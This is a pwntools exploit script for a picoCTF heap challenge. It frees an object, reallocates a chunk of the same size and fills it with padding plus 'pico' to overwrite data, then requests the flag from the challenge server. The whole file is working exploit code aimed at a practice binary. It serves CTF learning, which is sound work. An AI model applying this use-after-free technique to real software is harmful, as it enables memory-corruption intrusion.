#!/usr/bin/python3
from pwn import *

REMOTE = True
ip = 'tethys.picoctf.net'
port = 54858
filepath = './chall'
breakpoints = ['main+198']

gdbscript = '''
c
'''
gdbscript = "\n".join(['b *' + bp for bp in breakpoints]) + gdbscript

elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']
if REMOTE is True:
    p = remote(ip, port)
else:
    p = gdb.debug(filepath, gdbscript=gdbscript)
    ### OR if you want to start the process alone and attach gdb after
    # p = process(filepath)
    # gdb.attach(p)

print(p.recvuntil(b'Enter your choice: ').decode())
p.sendline(b'5') # Free x
print(p.recvuntil(b'Enter your choice: ').decode())
p.sendline(b'2') # Allocate object
print(p.recvuntil(b'Size of object allocation: ').decode())
p.sendline(b'35') # Size of object
print(p.recvuntil(b'Data for flag: ').decode())
p.sendline(b'a' * 30 + b'pico')
print(p.recvuntil(b'Enter your choice: ').decode())
p.sendline(b'4') # Get flag
print(p.recvall().decode())

p.interactive()